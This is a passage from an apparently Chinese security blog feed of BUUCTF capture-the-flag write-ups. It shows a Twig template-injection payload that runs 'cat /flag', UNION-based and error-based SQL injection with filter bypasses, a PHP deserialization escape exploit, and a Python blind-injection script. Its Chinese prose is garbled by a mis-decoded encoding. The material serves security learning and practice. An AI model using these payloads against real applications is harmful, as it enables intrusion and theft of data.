class="hljs-number">2</span>&#125;&#125;*&#123;&#123;<span class="hljs-number">2</span>*<span class="hljs-number">3</span>&#125;&#125;</code></pre></div><p>ç»“æœå›æ˜¾çš„æ˜¯hellow admin2*6ï¼Œæ­£å¥½æ˜¯ä¸Šé¢å›¾ç‰‡çš„ç¬¬ä¸€ç§æƒ…å†µï¼Œæ‰€ä»¥å°±æ˜¯Twigæ¨¡æ¿</p><p>æ‰¾åˆ°payloadï¼š</p><div class="hljs"><pre><code class="hljs clojure">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">"cat /flag"</span>)&#125;&#125;</code></pre></div><p><img src="https://i.loli.net/2020/12/16/3TSMP4x7K5ujoYA.png" srcset="/img/loading.gif" alt="image-20201216084621589"></p><p>å‚è€ƒ:<a href="https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´/#2-Twig" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ SSTI æ¼æ´ | K0rz3nâ€™s Blog</a></p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>æ³¨å†Œè´¦å·ç™»å½•åï¼Œå¯ä»¥ç”³è¯·å‘å¸ƒå¹¿å‘Šï¼Œåœ¨è¿™ä¸ªé¡µé¢å¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªxxsï¼Œä½†æ˜¯å¥½åƒæ²¡æ³•ç›´æ¥åˆ©ç”¨</p><p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094058451.png" srcset="/img/loading.gif" alt="image-20201216094058451"></p><p>æµ‹è¯•æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p><p>åœ¨ç”³è¯·å¹¿å‘Šæ˜¯è¾“å…¥æ ‡é¢˜<code>1&#39;111</code>ï¼Œæäº¤æ­£å¸¸ï¼Œä½†æ˜¯å½“æŸ¥çœ‹å¹¿å‘Šè¯¦æƒ…çš„æ—¶å€™å‡ºç°äº†æŠ¥é”™é¡µé¢ï¼Œè¿™ä¹Ÿè¯´æ˜äº†å­˜åœ¨sqlæ³¨å…¥,è€Œä¸”æ˜¯äºŒæ¬¡æ³¨å…¥</p><p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094728350.png" srcset="/img/loading.gif" alt="image-20201216094728350"></p><h3 id="0x1sqlæ³¨å…¥"><a href="#0x1sqlæ³¨å…¥" class="headerlink" title="0x1sqlæ³¨å…¥"></a>0x1sqlæ³¨å…¥</h3><p>æŸ¥çœ‹åˆ—æ•°ï¼Œç©ºæ ¼æ˜¯è¢«åŠ å…¥äº†é»‘åå•ï¼Œä½¿ç”¨/**/ä»£æ›¿ç©ºæ ¼ï¼Œä¸€ç›´åŠ åˆ°äº†22æ‰å‡ºç°å›æ˜¾ã€‚</p><div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div><p><img src="https://i.loli.net/2020/12/16/YLCR8ODt2wiSWfZ.png" srcset="/img/loading.gif" alt="image-20201216095035895"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥è¯¢åº“åï¼Œç›´æ¥ä½¿ç”¨å¸¸è§„çš„æŸ¥è¯¢æ–¹æ³•ä¼šå‘ç°å­˜åœ¨wafï¼Œæ— æ³•ä½¿ç”¨ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¿‡æ»¤orè¿™ä¸ªå…³é”®è¯ï¼Œå¯¼è‡´äº†informationä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±æ¢å¦å¤–ä¸€ç§æ–¹æ³•</p><div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>sys.schema_auto_increment_columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">schema</span>()</code></pre></div><p>æœ€åæ‰¾åˆ° äº†è¿™ä¸ªæ–¹æ³•</p><div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div><p><img src="https://i.loli.net/2020/12/16/1e7KM9aCEkoI4GS.png" srcset="/img/loading.gif" alt="image-20201216101152422"></p><p>æ¥ä¸‹æ¥å°±æ˜¯è·å–åˆ—åï¼Œä½†æ˜¯å¸¸è§„çš„æ–¹æ³•è¿˜æ˜¯ä¸èƒ½ç”¨ï¼Œåº”ä¸ºè¿˜æ˜¯å­˜åœ¨information</p><p>é‚£å°±ä½¿ç”¨ä¸€ç§æ–°çš„æŸ¥è¯¢æ–¹æ³•ï¼Œæ— åˆ—åæŸ¥è¯¢</p><p>åˆšå¼€å§‹ä»¥ä¸ºflagæ”¾åœ¨FLAG_TABLEä¸­ï¼Œä½†æ˜¯æç¤ºä¸å­˜åœ¨è¿™ä¸ªè¡¨ï¼Œåˆè¯•äº†è¯•usersè¡¨ï¼Œåœ¨ç¬¬ä¸‰åˆ—è¯»åˆ°äº†flag</p><p><img src="https://i.loli.net/2020/12/16/KiPL3omEjIanDcl.png" srcset="/img/loading.gif" alt="image-20201216103008504"></p><p>ä¸€å¼€å§‹ä»¥ä¸ºusersè¡¨çš„ç»“æ„æ˜¯ä¸¤åˆ—ï¼Œä½†æ˜¯æ³¨å…¥æ—¶ä¼šæŠ¥é”™ï¼Œè¯´æ˜ä¸æ˜¯ä¸¤åˆ—ï¼Œæµ‹è¯•ä¸‰åˆ—æ—¶å°±æ­£å¸¸äº†ï¼Œè¯´æ˜æ—¶ä¸‰åˆ—</p><p><img src="https://i.loli.net/2020/12/16/Hm7NBTF32ED5gp4.png" srcset="/img/loading.gif" alt="image-20201216103553070"></p><p>æŸ¥åˆ°ç¬¬ä¸‰åˆ—çš„æ—¶å€™çœ‹åˆ°äº†flag,payloadå¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(a)<span class="hljs-comment">/**/</span>from(select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>as<span class="hljs-comment">/**/</span>a<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>users)b),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div><p>å‚è€ƒï¼š<a href="https://www.jianshu.com/p/dc9af4ca2d06" target="_blank" rel="noopener">https://www.jianshu.com/p/dc9af4ca2d06</a></p><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$function = @$_GET[<span class="hljs-string">'f'</span>];<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($img)</span></span>&#123;    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>,<span class="hljs-string">'flag'</span>,<span class="hljs-string">'php5'</span>,<span class="hljs-string">'php4'</span>,<span class="hljs-string">'fl1g'</span>);    $filter = <span class="hljs-string">'/'</span>.implode(<span class="hljs-string">'|'</span>,$filter_arr).<span class="hljs-string">'/i'</span>;    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">''</span>,$img);&#125;<span class="hljs-keyword">if</span>($_SESSION)&#123;    <span class="hljs-keyword">unset</span>($_SESSION);&#125;$_SESSION[<span class="hljs-string">"user"</span>] = <span class="hljs-string">'guest'</span>;$_SESSION[<span class="hljs-string">'function'</span>] = $function;extract($_POST);<span class="hljs-keyword">if</span>(!$function)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;&#125;<span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">'img_path'</span>])&#123;    $_SESSION[<span class="hljs-string">'img'</span>] = base64_encode(<span class="hljs-string">'guest_img.png'</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $_SESSION[<span class="hljs-string">'img'</span>] = sha1(base64_encode($_GET[<span class="hljs-string">'img_path'</span>]));&#125;$serialize_info = filter(serialize($_SESSION));<span class="hljs-keyword">if</span>($function == <span class="hljs-string">'highlight_file'</span>)&#123;    highlight_file(<span class="hljs-string">'index.php'</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'phpinfo'</span>)&#123;    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'phpinfo();'</span>); <span class="hljs-comment">//maybe you can find something in here!</span>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'show_image'</span>)&#123;    $userinfo = unserialize($serialize_info);    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="hljs-string">'img'</span>]));&#125;</code></pre></div><p>ç¬¬33è¡Œä»£ç æç¤ºäº†phpinfoä¸­æœ‰éšè—çš„ä¸œè¥¿ï¼ŒGETæäº¤<code>f=phpinfo</code>ï¼Œä¼šåœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶çš„åå­—<strong>d0g3_f1ag.php</strong></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥çš„ç›®çš„å°±æ˜¯é€šè¿‡ä¸€äº›æ–¹æ³•è¯»å–åˆ°é‡Œé¢çš„ä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°æœ€åä¸€è¡Œå­˜åœ¨ä¸€ä¸ª file_get_contentå‡½æ•°ï¼Œç»“åˆé¢˜ç›®æ ‡é¢˜ï¼Œå¯ä»¥çŒœåˆ°æ˜¯ååºåˆ—åŒ–åŠ æ–‡ä»¶è¯»å–çš„é¢˜ç›®ã€‚</p><h3 id="0x1ä»£ç å®¡è®¡"><a href="#0x1ä»£ç å®¡è®¡" class="headerlink" title="0x1ä»£ç å®¡è®¡"></a>0x1ä»£ç å®¡è®¡</h3><p>ä»£ç æœ€åä¸€è¡Œæœ‰ä¸€ä¸ª<code>file_get_contents</code>æ˜¯èƒ½å¤Ÿè¯»å–æ–‡ä»¶çš„å‡½æ•°ï¼Œä»–è¿™é‡Œè¯»å–çš„æ˜¯base64è§£å¯†çš„â€™imgâ€™,å¾€å‰æ‰¾è¿™ä¸ªâ€™imgâ€™ï¼Œå¯ä»¥å‘ç°å¦‚æœæˆ‘ä»¬æœ‰ä¼ å…¥img_pathï¼Œå®ƒä¼šç»è¿‡sha1åŠ å¯†ï¼Œå¯¼è‡´ç›®æ ‡è·¯å¾„å¤±æ•ˆã€‚å¦‚æœæˆ‘ä»¬æ²¡æœ‰ä¼ å…¥img_pathï¼Œé‚£ä¹ˆåå°å°†é»˜è®¤èµ‹å€¼ä¸ºguest_img.pngçš„base64ç¼–ç ã€‚è¿™æ ·çœ‹æ¥è¿™ä¸ª<code>$userinfo[&#39;img&#39;]</code>å¹¶ä¸æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ­¤æ—¶éœ€è¦æŠŠæ³¨æ„åŠ›è½¬ç§»åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•°serializeä¸Šï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ¼æ´ç‚¹ï¼Œæ•°æ®ç»è¿‡åºåˆ—åŒ–äº†ä¹‹ååˆç»è¿‡äº†ä¸€å±‚è¿‡æ»¤å‡½æ•°ï¼Œå°±æ˜¯æ•°ç»„é‡Œæåˆ°çš„<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>éƒ½ä¼šè¢«ç©ºæ ¼æ›¿ä»£ï¼Œè€Œè¿™å±‚è¿‡æ»¤å‡½æ•°ä¼šå¹²æ‰°åºåˆ—åŒ–åçš„æ•°æ®ã€‚</p><h3 id="0x2phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#0x2phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="0x2phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>0x2phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h3><p>åˆ©ç”¨è¿‡æ»¤å‡½æ•°è€Œå¯¼è‡´åºåˆ—åŒ–ç»“æœäº§ç”Ÿæ–°çš„ç»“æœï¼Œä¹‹å‰å†™è¿‡ç±»ä¼¼çš„<a href="https://sunzy.icu/2020/11/17/UNCTF/" target="_blank" rel="noopener">æ–‡ç« </a></p><p><img src="https://i.loli.net/2020/12/20/37JhPXH6GqbeuSI.png" srcset="/img/loading.gif" alt="image-20201220213459548"></p><p>è¿™é‡Œé‡æ–°æ„é€ å‡ºçš„åºåˆ—åŒ–å€¼ä¸ºï¼š</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"user"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">24</span>:<span class="hljs-string">""</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ° çœŸæ­£çš„<code>$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;</code> è¢«æŠ›å¼ƒæ‰äº†ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨æ„é€ è¿™æ®µå­—ç¬¦æ—¶æ˜¯è®¾è®¡å¥½é•¿åº¦çš„ï¼Œ<code>s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}</code>ï¼Œè¿™é‡Œçš„ } ä¸ä¹‹å‰çš„ { é—­åˆï¼Œè®©ååºåˆ—æå‰ç»“æŸï¼Œä»è€Œçœ‹åˆ°ååºåˆ—åŒ–çš„å†…å®¹ä¸º</p><div class="hljs"><pre><code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta-string">"user"</span></span>]=&gt;<span class="hljs-keyword">string</span>(<span class="hljs-number">24</span>) <span class="hljs-string">""</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;s:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>[<span class="hljs-meta"><span class="hljs-meta-string">"img"</span></span>]=&gt;<span class="hljs-keyword">string</span>(<span class="hljs-number">20</span>) <span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>[<span class="hljs-meta"><span class="hljs-meta-string">"dd"</span></span>]=&gt;<span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">"a"</span></code></pre></div><p>æ ¹æ®ä¸Šé¢çš„æ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†imgå­—æ®µçš„å€¼æ”¹ä¸ºphpinfoä¸­ç»™çš„æ–‡ä»¶åçš„base64å€¼ï¼Œä»è€Œè¯»å–å…¶å†…å®¹</p><p>æ„é€ payload</p><div class="hljs"><pre><code class="hljs php">get:f=show_imagepost:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>]=<span class="hljs-title">a</span>"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div><p><img src="https://i.loli.net/2020/12/20/ESz2xIZWJD8j7Rk.png" srcset="/img/loading.gif" alt="image-20201220213803529"></p><p>æç¤ºäº†flagåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œé‚£å°±å°†ä¸Šé¢çš„imgå­—æ®µå€¼æ¢æˆè¿™ä¸ªæ–‡ä»¶åçš„base64å€¼</p><div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">base64</span><span class="hljs-params">(/d0g3_fllllllag)</span></span> = L2QwZzNfZmxsbGxsbGFn</code></pre></div><p>payload:</p><div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">get</span>:f=show_imagepost:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";&#125;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>md5</tag>
      
      <tag>ssrf</tag>
      
      <tag>system</tag>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-sqlæ³¨å…¥</title>
    <link href="/2020/10/05/buuoj/"/>
    <url>/2020/10/05/buuoj/</url>
    
    <content type="html"><![CDATA[<h1 id="buuctfâ€“æ³¨å…¥ç¯‡"><a href="#buuctfâ€“æ³¨å…¥ç¯‡" class="headerlink" title="buuctfâ€“æ³¨å…¥ç¯‡"></a>buuctfâ€“æ³¨å…¥ç¯‡</h1><a id="more"></a><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>ç»™äº†æç¤ºï¼Œ<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p><p>çŒœæµ‹flagåœ¨flag è¡¨ä¸­ï¼ŒæŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯ select flag from flag</p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œor,union,orderç­‰ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨</p><p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" srcset="/img/loading.gif" alt></p><p>æ„é€ ç›²æ³¨è¯­å¥</p><p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p><p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" srcset="/img/loading.gif" alt></p><p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" srcset="/img/loading.gif" alt></p><p>ä¸¤æ¬¡çš„æç¤ºè¯­å¥ä¸ä¸€æ ·ï¼Œè¯´æ˜è¿™ä¸ªæ³¨å…¥è¯­å¥æ˜¯å¯¹çš„ï¼Œä¸”å½“æç¤ºHelloæ—¶åº”è¯¥æ˜¯å¯¹çš„ã€‚</p><div class="hljs"><pre><code class="hljs python">// äºŒåˆ†æ³¨å…¥<span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php"</span>data = &#123;id : <span class="hljs-string">""</span>&#125;flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):    left = <span class="hljs-number">33</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(right&gt;left):        data[<span class="hljs-string">"id"</span>] = <span class="hljs-string">"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)"</span>.format(i,mid)        response = requests.post(url,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">"Hello"</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    flag = flag + chr(mid)    print(flag)print(flag)</code></pre></div><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><p>æµ‹è¯•å‘ç°<code>or,union,substr,ç©ºæ ¼,/**/</code>ç­‰éƒ½è¢«åŠ å…¥é»‘åå•ï¼ŒåŒå†™ä¹Ÿæ— æ³•ç»•è¿‡</p><p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" srcset="/img/loading.gif" alt></p><p>å¯æ˜¯ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><blockquote><p>æŠ¥é”™æ³¨å…¥åŸç†ï¼š</p><p>å…¶åŸå› ä¸»è¦æ˜¯å› ä¸ºè™šæ‹Ÿè¡¨çš„ä¸»é”®é‡å¤ã€‚æŒ‰ç…§MySQLçš„å®˜æ–¹è¯´æ³•ï¼Œgroup byè¦è¿›è¡Œä¸¤æ¬¡è¿ç®—ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ‹¿group byåé¢çš„å­—æ®µå€¼åˆ°è™šæ‹Ÿè¡¨ä¸­å»å¯¹æ¯”å‰ï¼Œé¦–å…ˆè·å–group byåé¢çš„å€¼ï¼›ç¬¬äºŒæ¬¡æ˜¯å‡è®¾group byåé¢çš„å­—æ®µçš„å€¼åœ¨è™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨ï¼Œé‚£å°±éœ€è¦æŠŠå®ƒæ’å…¥åˆ°è™šæ‹Ÿè¡¨ä¸­ï¼Œè¿™é‡Œåœ¨æ’å…¥æ—¶ä¼šè¿›è¡Œç¬¬äºŒæ¬¡è¿ç®—ï¼Œç”±äºrandå‡½æ•°å­˜åœ¨ä¸€å®šçš„éšæœºæ€§ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡è¿ç®—çš„ç»“æœå¯èƒ½ä¸ç¬¬ä¸€æ¬¡è¿ç®—çš„ç»“æœä¸ä¸€è‡´ï¼Œä½†æ˜¯è¿™ä¸ªè¿ç®—çš„ç»“æœå¯èƒ½åœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨äº†ï¼Œé‚£ä¹ˆè¿™æ—¶çš„æ’å…¥å¿…ç„¶å¯¼è‡´ä¸»é”®çš„é‡å¤ï¼Œè¿›è€Œå¼•å‘é”™è¯¯ã€‚</p></blockquote><p>ç›¸å…³é“¾æ¥</p><p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html" target="_blank" rel="noopener">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p><p><a href="https://www.jianshu.com/p/d8ae3e8dabdc" target="_blank" rel="noopener">https://www.jianshu.com/p/d8ae3e8dabdc</a></p><p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610" target="_blank" rel="noopener">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® </p></blockquote><p>æŸ¥è¯¢è¯­å¥å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">'H4rDsq1'</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div><p>è¿™é‡Œä¼šå‘ç°flagæ˜¾ç¤ºä¸å…¨ï¼Œå¯èƒ½æ˜¯æŠ¥é”™ç°å®çš„å­—æ•°é™åˆ¶ï¼Œåˆ©ç”¨right/leftå‡½æ•°ï¼Œæ˜¾ç¤ºéƒ¨åˆ†çš„flagï¼Œä¹‹åæ‹¼æ¥èµ·æ¥</p><p>æ˜¾ç¤ºåé¢çš„flag</p><div class="hljs"><pre><code class="hljs 